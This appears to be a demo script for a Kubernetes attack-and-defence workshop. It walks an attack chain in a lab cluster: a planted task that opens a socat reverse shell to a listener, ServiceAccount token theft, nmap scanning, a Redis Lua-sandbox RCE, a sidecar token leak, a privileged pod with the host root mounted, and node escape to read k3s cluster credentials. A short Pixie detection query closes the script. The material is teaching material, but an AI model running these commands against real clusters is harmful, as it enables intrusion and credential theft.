# IKT-Linz 2027 — the demo script (canonical, do not improvise)

Source of truth: `ixi/iktlinz2027-0a3f45c8/1.lesson-green/unit-{2..7}.md` plus the
`__static__` screenshots. **This is a demo: most armory buttons are inert.** Only
the actions below are real — never free-run Ran's recommendation engine.

RanUI model: **select an entity in the graph → the Actions panel lists its
"Applicable" TTPs → pick one → a param dialog opens → Execute.**

Executable form: `demo_chain.py` (step numbers below match `--only N`).

---

## Unit 2 — "1 · Exec into the pod" (gate-breach)

**1. Create the listener.** Click the **Ran** node → Armory → *Resource
Development* → **Create Listener** → params `LHOST 0.0.0.0`, `PORT 1337`,
`PROTOCOL tcp` → **Execute**. A listener badge (`1337`) appears next to Ran.

**2. Spawn a worker that calls back.** In the **dev-machine** terminal — this is
a terminal step, not a Ran TTP. It POSTs a task to the orchestrator's NodePort,
which deploys a **worker pod** that installs socat and phones home:

```shell
LHOST=$(hostname -i)          # locally: the node InternalIP
LPORT=1337
TASK_ID=callback-1
NODE_IP=$(kubectl get nodes -o jsonpath='{.items[0].status.addresses[?(@.type=="InternalIP")].address}')

curl -sS -X POST http://${NODE_IP}:30080/tasks -H 'Content-Type: application/json' -d @- <<EOF
{"id":"${TASK_ID}",
 "repo":"https://github.com/Magier/ikt26",
 "cmd":"apt update; apt install -y socat; socat TCP:${LHOST}:${LPORT} EXEC:sh "}
EOF
```

**3. Catch it.** Wait for the worker pod to be Ready; Ran logs `session
connected … user=root` and a new **UnknownSystem** appears in the graph.

**4. Orient.** Select the new system → *Discovery* → **Read Environment
variables** (or the play icon next to `envVars`). The graph expands with the
services and the worker's own pod identity.

## Unit 3 — "2 · Token theft and a dropped kubectl" (token-theft)

5. Click the `agent-worker-*` pod → *Credential Access* → **Read ServiceAccount Token**.
   (The token also reveals the pod name and **the node it runs on**.)
6. *Execution* → **Install kubectl** (lands in `/tmp`).
7. Select the `agent-worker` **ServiceAccount** → *Discovery* → **Check Token permissions**.

> Expected: ***nothing useful*** — only `selfsubject*reviews`. The attack still
> generated five alerts. That is the teaching point.

## Unit 4 — "3 · Network discovery" (network-discovery)

8. Select the `agent-worker-*` pod → *Execution* → **Install Package**, `PKG=nmap`.
9. *Discovery* → **Get local IP address** (the scan needs a range).
10. *Discovery* → **NMap Host Scan**.

> ⚠ Bound the CIDR. The default `${TARGET.IP}/24` full-port `sT` sweep never
> finishes inside the 150s shell budget and **wedges the single reverse shell**.
> Use the `/27` around the foothold + `FAST_SCAN` (≈3s, still finds every target).

## Unit 5 — "4 · Redis RCE → agent-orchestrator permissions" (kubelet-exec)

### Part 1 — Redis RCE
11. Click the `redis` pod in `oopservability` → *Lateral Movement* → **Exploit
    Redis CVE-2022-0543**. It **fails** — no `redis-cli` in the pod. (Intentional.)
12. On `agent-worker-*`: *Execution* → **Install Package**, `PKG=redis-tools`.
13. Focus `redis` again → execute the RCE. Now it succeeds (Lua sandbox escape).
14. *Credential Access* → **Read ServiceAccount Token** on the Redis pod.
15. Check that token's permissions **on the `oopservability-redis-*` pod**
    (needs `curl` installed there; checking on `agent-worker-*` would wrongly
    read the worker's own token).

### Part 2 — OTel credential leak (**CVE-2026-47701**)
16. Select the `oopservability-redis` **ServiceAccount** → *Credential Access* →
    **Create ServiceMonitor with Bearer Token File** — keep defaults.
17. Select the `oopservability-redis-*` pod → *Credential Access* → **Extract
    ServiceAccount Token via CVE-2026-47701**.
18. ≥1 new ServiceAccount token is added (expand the operation-log entry to see
    how many entities were discovered).

Why it works: an otel-collector sidecar is mounted into workloads; the vulnerable
Target Allocator accepts the unsafe `bearerTokenFile`; the injected sidecar in
**agent-orchestrator** reads **its own** token and sends it as an Authorization
header to Redis's `metric-receiver`, which stores it in Redis
(`oopservability:receiver:last-authorization`). The RCE reads it back.

> **Prerequisites** (the course's `simulate_otel_admission_mutation`): the
> `orchestrator-otel-sidecar-config` ConfigMap + the sidecar patch on
> agent-orchestrator, **and** the `redis-metrics` **ServiceMonitor** CR. Without
> them the Redis key stays empty.

## Unit 6 — "5 · Spawn a privileged worker" (privileged-worker)

19. Select the captured token → **Check Token Permissions** (it is
    **agent-orchestrator**'s: it may create Pods/Jobs in `agent-system`).
20. *Execution* → **Deploy Container** — attacker-controlled worker:
    - `Arguments`: `TCP:<dev-machine IP>:1337` and `EXEC:sh`
    - ensure the **hostPath mount of `/`** is set
    - also set `ServiceAccount` + `NodeName` explicitly, else the pod renders
      `serviceAccountName: false` and the API rejects it.
21. When the callback arrives you control the privileged Pod (2nd session).

## Unit 7 — "6 · Finale: escape the node" (node-escape)

22. From the created pod, enter the host environment and **prove which node**
    (`nsenter --target 1 … hostname`; needs `hostPID`).
23. Search the mounted host filesystem for Kubernetes config / credentials.
24. It is **k3s**, so the interesting locations are:
    - `/var/lib/rancher/k3s`
    - `/etc/rancher/k3s`   ← `k3s.yaml` holds the cluster credentials

> End-state: a low-privilege Redis compromise became control of a workload, then
> a node. The lesson is not the final file — it is every trust boundary that
> allowed the next step.

---

## Detection side (for the defenders' half of the workshop)

Pixie scratchpad — spot the scan by unique destinations per process:

```sh
cat <<'EOF2' > /tmp/network_map.pxl
import px
df = px.DataFrame(table='conn_stats', start_time='-10m')
df.pod = df.ctx['pod']
df.cmd = df.ctx['cmd']
df = df.groupby(['pod', 'upid', 'cmd', 'remote_addr', 'remote_port']).agg()
df = df.groupby(['pod', 'upid', 'cmd']).agg(unique_destinations=('remote_addr', px.count))
px.display(df, 'scan_candidates')
EOF2
px run -f /tmp/network_map.pxl
```
